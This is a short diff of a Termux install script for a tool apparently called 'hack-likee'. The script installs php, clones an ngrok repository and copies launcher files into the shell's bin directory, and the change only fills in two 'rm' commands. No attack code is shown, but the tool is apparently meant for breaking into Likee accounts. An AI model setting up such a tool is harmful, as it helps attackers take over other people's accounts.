@@ -4,8 +4,8 @@ pkg install php -y
 cd $HOME
 git clone https://github.com/fh-rabbi/ngrok
 cd $HOME
-rm
-rm
+rm LICENSE
+rm README.md
 cd $HOME/hack-likee
 mv pw /data/data/com.termux/files/usr/bin
 mv start-hl /data/data/com.termux/files/usr/bin
